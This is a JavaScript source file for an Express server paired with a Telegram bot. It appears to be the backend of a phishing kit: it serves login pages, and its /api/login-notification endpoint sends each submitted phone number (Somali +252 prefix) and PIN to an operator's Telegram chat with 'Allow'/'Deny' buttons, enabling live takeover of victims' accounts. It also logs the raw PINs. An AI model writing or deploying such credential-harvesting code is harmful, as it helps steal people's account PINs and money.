const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- ENV CHECK --------------------
if (!process.env.BOT_TOKEN) {
    console.error("❌ BOT_TOKEN is missing");
    process.exit(1);
}

const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
console.log("🟡 ADMIN_ID:", ADMIN_ID);

// -------------------- BOT INIT --------------------
const bot = new Telegraf(process.env.BOT_TOKEN);

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/:page', (req, res) => {
    const file = req.params.page.endsWith('.html')
        ? req.params.page
        : req.params.page + '.html';

    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) {
            console.error("❌ Page not found:", file);
            res.status(404).send("Page not found");
        }
    });
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};

    console.log("📩 LOGIN REQUEST RECEIVED:", req.body);

    if (!phone || !pin) {
        console.log("❌ Missing data");
        return res.status(400).json({ error: "Missing phone or pin" });
    }

    if (!ADMIN_ID) {
        return res.status(500).json({ error: "ADMIN_CHAT_ID missing" });
    }

    const message =
        `📱 LOGIN ATTEMPT\n\n` +
        `📞 Phone: +252${phone}\n` +
        `🔢 PIN: ${pin}\n` +
        `⏰ Time: ${new Date().toLocaleString()}`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow", callback_data: `approve_${phone}_${pin}` }
                    ],
                    [
                        { text: "❌ Deny", callback_data: "deny" }
                    ]
                ]
            }
        });

        console.log("✅ Telegram message sent");
        res.json({ success: true });

    } catch (err) {
        console.error("❌ TELEGRAM ERROR:", err);
        res.status(500).json({ error: "Failed to send message" });
    }
});

// -------------------- BOT START --------------------
bot.start((ctx) => {
    ctx.reply("🤖 Bot is active and running");
});

// APPROVE ACTION
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];

    const msg =
        `✅ APPROVED LOGIN\n\n` +
        `📞 +252${phone}\n` +
        `🔐 ${pin}`;

    try {
        await ctx.editMessageText(msg);
    } catch (e) {
        console.error("❌ EDIT ERROR:", e.message);
    }
});

// DENY ACTION
bot.action('deny', async (ctx) => {
    try {
        await ctx.editMessageText("❌ LOGIN DENIED");
    } catch (e) {
        console.error("❌ DENY ERROR:", e.message);
    }
});

// -------------------- START SERVER --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// SAFE BOT LAUNCH
const startBot = async () => {
    try {
        await bot.telegram.deleteWebhook();
        await bot.launch();
        console.log("🤖 Bot launched successfully");
    } catch (err) {
        console.error("❌ BOT LAUNCH ERROR:", err);
    }
};

startBot();

// -------------------- GLOBAL ERROR HANDLING --------------------
process.on('unhandledRejection', (err) => {
    console.error("❌ UNHANDLED REJECTION:", err);
});

process.on('uncaughtException', (err) => {
    console.error("❌ UNCAUGHT EXCEPTION:", err);
});
